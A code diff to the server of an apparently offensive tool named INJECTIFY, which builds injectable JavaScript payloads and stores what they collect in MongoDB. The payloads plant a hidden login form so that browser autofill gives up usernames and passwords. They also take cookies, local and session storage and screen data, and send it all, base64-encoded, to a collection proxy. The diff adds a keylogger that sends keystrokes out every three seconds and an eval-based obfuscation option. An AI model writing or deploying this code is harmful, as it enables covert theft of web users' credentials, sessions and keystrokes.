@@ -481,6 +481,7 @@ MongoClient.connect(config.mongodb, function(err, db) {
 		var Record = record => {
 			return new Promise((resolve, reject) => {
 				let project			= "a",
+					type			= "t",
 					username		= "b",
 					password		= "c",
 					url				= "d",
@@ -536,47 +537,49 @@ MongoClient.connect(config.mongodb, function(err, db) {
 									} catch(e) {
 
 									}
-									try {
-										if(record[cookies]) {
-											var pairs = record[cookies].split(";")
-											var c = {}
-											for (var i=0; i<pairs.length; i++){
-												var pair = pairs[i].split("=")
-												c[pair[0]] = unescape(pair[1])
+									if(record[type] == 0) {
+										try {
+											if(record[cookies]) {
+												var pairs = record[cookies].split(";")
+												var c = {}
+												for (var i=0; i<pairs.length; i++){
+													var pair = pairs[i].split("=")
+													c[pair[0]] = unescape(pair[1])
+												}
+											} else {
+												var c = record[cookies]
 											}
-										} else {
+										} catch(e) {
+											//throw(e)
 											var c = record[cookies]
 										}
-									} catch(e) {
-										//throw(e)
-										var c = record[cookies]
-									}
-									projects.updateOne({
-										name: record[project]
-									},
-									{
-										$push: {
-											records: {
-												timestamp	: Math.round(new Date().getTime() / 1000),
-												username	: record[username],
-												password	: record[password],
-												url			: record[url],
-												ip			: ip,
-												browser: {
-													width	: record[width],
-													height	: record[height],
-													headers	: req.headers
-												},
-												storage : {
-													local	: record[localStorage],
-													session	: record[sessionStorage],
-													cookies	: c
+										projects.updateOne({
+											name: record[project]
+										},
+										{
+											$push: {
+												records: {
+													timestamp	: Math.round(new Date().getTime() / 1000),
+													username	: record[username],
+													password	: record[password],
+													url			: record[url],
+													ip			: ip,
+													browser: {
+														width	: record[width],
+														height	: record[height],
+														headers	: req.headers
+													},
+													storage : {
+														local	: record[localStorage],
+														session	: record[sessionStorage],
+														cookies	: c
+													}
 												}
 											}
-										}
-									}).then(() => {
-										resolve("wrote record to database")
-									})
+										}).then(() => {
+											resolve("wrote record to database")
+										})
+									}
 								})
 							} else {
 								reject("project " + record[project] + " doesn't exist")
@@ -714,16 +717,40 @@ MongoClient.connect(config.mongodb, function(err, db) {
 	})
 
 	app.get('/payload/*', (req, res) => {
-		function enc(string) {
+		function enc(string, eval) {
 			if(req.query.base64 == "false") {
-				return '"' + string + '"'
+				if (eval) {
+					return string
+				} else {
+					return '"' + string + '"'
+				}
 			} else {
-				return 'atob("' + btoa(string) + '")'
+				if (eval) {
+					return 'eval(atob("' + btoa(string) + '"))'
+				} else {
+					return 'atob("' + btoa(string) + '")'
+				}
+			}
+		}
+		function comment(message) {
+			if (req.query.comments == "true") {
+				return '\n// ' + message
+			} else {
+				return ''
+			}
+		}
+		function debug(script) {
+			if (req.query.debug == "true") {
+				return '\n' + script
+			} else {
+				return ''
 			}
 		}
 		let valid = true
 		if (!req.query.project) valid = false
 
+		let keylogger		= false
+		if (req.query.keylogger == "true") keylogger = true
 		let screenSize		= true
 		if (req.query.screenSize == "false") screenSize = false
 		let location		= true
@@ -741,9 +768,49 @@ MongoClient.connect(config.mongodb, function(err, db) {
 		if (valid) {
 			res.setHeader('Content-Type', 'application/javascript')
 
-			let json		= '',
-				variables	= ''
+			let variables	= '',
+				header		= '',
+				json		= '',
+				body		= ''
 
+			if (keylogger) {
+				variables += 'm = {}, f = [],'
+				header += `
+					`+ comment("add listeners to the window for keydown & keyup events") + `
+					k.onkeydown = b
+					k.onkeyup = b
+				`
+				body += `
+					function b(n) {` + comment("if the key type ends with p => then it's keyup") + `
+						n.type.slice(-1) == 'p' ? l = '_' : l = ''
+						h = n.keyCode
+						if(!h) return
+						z = h + l` + comment("ignore multiple modifier calls") + `
+						if(m == z) return` + comment("Push to array") + `
+						f.push(z)` + comment("return function and update the value of the last m(odifier) key press") + `
+						if (n.key && n.key.length > 1) m = z
+						` + debug(`
+							if (n.key && n.key.length > 1) {
+								console.log('%c[keylogger@INJECTIFY] %cModifier key state changed', 'color: #ef5350; font-weight: bold', 'color: #FF9800', n)
+							} else {
+								console.log('%c[keylogger@INJECTIFY] %cKey state changed', 'color: #ef5350; font-weight: bold', 'color: #FF9800', n)
+							}
+						`) + `
+					}
+
+					setInterval(function() {` + comment("if the array is empty, skip making a request") + `
+						if(!f.length) return
+						c.src = p + btoa(
+							JSON.stringify({
+								a: atob("` + btoa(req.query.project) + `"),
+								t: 1,
+								b: f
+							})
+						)
+						f = []
+					}, 3000)
+				`
+			}
 			if (screenSize) {
 				variables	+= 'j = k.screen, a = k.devicePixelRatio,'
 				json		+= 'e: j.height * a, f: j.width * a,'
@@ -768,7 +835,10 @@ MongoClient.connect(config.mongodb, function(err, db) {
 				// │ base64         │ BOOLEAN │ TRUE     │
 				// │ obfuscate      │ BOOLEAN │ FALSE    │
 				// │ minify         │ BOOLEAN │ FALSE    │
+				// │ comments       │ BOOLEAN │ FALSE    │
+				// | debug          | BOOLEAN | FALSE    |
 				// │                │         │          │
+				// | keylogger      │ BOOLEAN │ FALSE    |
 				// │ screenSize     │ BOOLEAN │ TRUE     │
 				// │ location       │ BOOLEAN │ TRUE     │
 				// │ localStorage   │ BOOLEAN │ TRUE     │
@@ -782,25 +852,30 @@ MongoClient.connect(config.mongodb, function(err, db) {
 					v = ` + enc("input") + `,
 					w = d.createElement(` + enc("form") + `),
 					x = d.createElement(v),
-					r = new Image,
+					c = ` + enc("new Image()", true) + `,
+					p = `+ enc(proxy) +`,
 					k = window` + variables + `
-				x.name = ""
+				` + header + comment("name attribute is required for autofill to work") + `
+				x.name = ""` + comment("autofill still works if the elements are non-rendered") + `
 				x.style = `+ enc("display:none") + `
-
-				var y = x.cloneNode()
+				` + comment("clone the input node instead of declaring it again") + `
+				var y = x.cloneNode()` + comment("set the input type to password") + `
 				y.type = ` + enc("password") + `
-
+				` + comment("append elements to form node") + `
 				w.appendChild(x)
-				w.appendChild(y)
+				w.appendChild(y)` + comment("append form node to DOM") + `
 				d.body.appendChild(w)
-
-				y.addEventListener(v, function () {
+				` + body + comment("add a listener to the password input, browser's autofiller will trigger this") + `
+				y.addEventListener(v, function () {` + comment("construct an object with data to extract") + `
 					var i = {
 						a: atob("` + btoa(req.query.project) + `"),
+						t: 0,
 						b: x.value,
 						c: y.value` + json + `
 					}
-					r.src = ` + enc(proxy) + ` + btoa(JSON.stringify(i))
+					` + debug("console.log('%c[INJECTIFY] %cCaptured username & password', 'color: #ef5350; font-weight: bold', 'color: #FF9800', i)") +
+						comment("send a request to the server (or proxy) with the BASE64 encoded JSON object") + `
+					c.src = p + btoa(JSON.stringify(i))` + comment("remove the form node from the DOM (so it can't be (easily) seen in devtools)") + `
 					w.remove()
 				})
 			`
@@ -838,7 +913,10 @@ MongoClient.connect(config.mongodb, function(err, db) {
 			// │ base64         │ BOOLEAN │ TRUE     │
 			// │ obfuscate      │ BOOLEAN │ FALSE    │
 			// │ minify         │ BOOLEAN │ FALSE    │
+			// │ comments       │ BOOLEAN │ FALSE    │
+			// | debug          | BOOLEAN | FALSE    |
 			// │                │         │          │
+			// | keylogger      │ BOOLEAN │ FALSE    |
 			// │ screenSize     │ BOOLEAN │ TRUE     │
 			// │ location       │ BOOLEAN │ TRUE     │
 			// │ localStorage   │ BOOLEAN │ TRUE     │
